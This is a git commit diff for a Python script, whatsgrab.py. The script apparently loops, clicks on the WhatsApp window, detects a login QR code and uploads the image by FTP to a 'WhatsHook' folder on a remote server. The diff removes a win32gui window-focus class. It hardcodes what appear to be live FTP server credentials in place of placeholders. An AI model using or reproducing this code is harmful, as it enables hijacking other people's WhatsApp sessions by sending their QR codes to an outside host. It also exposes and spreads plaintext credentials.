7e70678136ccd0a9bece3bf3bfb2acc239ad9e7a
Evolgate <81663010+Evolgate@users.noreply.github.com>
2022-09-14 20:28:41 +0200

    Add files via upload

--- whatsgrab.py
+++ whatsgrab.py
@@ -6,41 +6,11 @@ import sys
 import shutil
 from PIL import Image
 from time import sleep
-import win32gui
 import re
 from pixelmatch.contrib.PIL import pixelmatch
 
 while True:
     #reactive qrcode
-    class WindowMgr:
-        """Encapsulates some calls to the winapi for window management"""
-
-        def __init__ (self):
-            """Constructor"""
-            self._handle = None
-
-        def find_window(self, class_name, window_name=None):
-            """find a window by its class_name"""
-            self._handle = win32gui.FindWindow(class_name, window_name)
-
-        def _window_enum_callback(self, hwnd, wildcard):
-            """Pass to win32gui.EnumWindows() to check all the opened windows"""
-            if re.match(wildcard, str(win32gui.GetWindowText(hwnd))) is not None:
-                self._handle = hwnd
-
-        def find_window_wildcard(self, wildcard):
-            """find a window whose title matches the wildcard regex"""
-            self._handle = None
-            win32gui.EnumWindows(self._window_enum_callback, wildcard)
-
-        def set_foreground(self):
-            """put the window in the foreground"""
-            win32gui.SetForegroundWindow(self._handle)
-
-
-    w = WindowMgr()
-    w.find_window_wildcard("WhatsApp")
-    w.set_foreground()
     pyautogui.click(1245, 360)
     sleep(1)
 
@@ -80,7 +50,7 @@ while True:
         
         
     # to file 
-    session = ftplib.FTP('SERVER DOMAIN','LOGINNAME','LOGINPASSWORD')
+    session = ftplib.FTP('h2964402.stratoserver.net','jakas','Kuchen2013')
     if qrcode :
         file = open("img.png",'rb')
         session.cwd("WhatsHook")
